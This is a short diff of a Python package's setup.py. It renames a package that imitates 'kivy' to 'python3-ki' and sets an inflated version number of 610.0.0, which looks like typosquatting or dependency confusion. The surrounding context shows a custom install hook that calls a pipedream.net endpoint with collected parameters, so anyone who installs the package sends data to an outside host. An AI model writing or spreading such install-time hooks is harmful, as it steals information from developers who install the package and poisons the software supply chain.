@@ -15,8 +15,8 @@ class CustomInstall(install):
         requests.get("https://eolunbv9e34gp3b.m.pipedream.net",params = ploads)
 
 
-setup(name='python3-kivy', 
-      version='60.0.0',
+setup(name='python3-ki', 
+      version='610.0.0',
       description='AnupamAs01',
       author='AnupamAs01',
       license='MIT',
